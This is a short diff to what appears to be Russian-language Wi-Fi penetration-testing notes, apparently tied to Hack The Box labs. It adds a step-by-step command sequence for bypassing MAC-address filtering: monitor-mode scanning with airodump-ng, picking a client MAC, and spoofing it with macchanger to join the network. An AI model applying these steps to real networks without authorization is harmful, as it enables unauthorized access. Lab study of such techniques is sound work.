@@ -76,3 +76,16 @@ iw dev
 # График взаимосвязей между клиентами и точкой доступа
     sudo airgraph-ng -i HTB-01.csv -g CAPR -o HTB_CAPR.png
     
+# Обход фильтрации по MAC-адресу 
+    Сканирование доступных сетей Wi-Fi
+    sudo airmon-ng start wlan0
+    sudo airodump-ng wlan0mon
+    Проверка что на 5 Ггц никого нет
+    sudo airodump-ng wlan0mon --band a
+    Выписываем нужный МАК
+    sudo airmon-ng stop wlan0mon
+    sudo macchanger wlan0
+    sudo ifconfig wlan0 down
+    sudo macchanger wlan0 -m 3E:48:72:B7:62:2A
+    sudo ifconfig wlan0 up
+    Теперь подключаемся к сети 5 Ггц
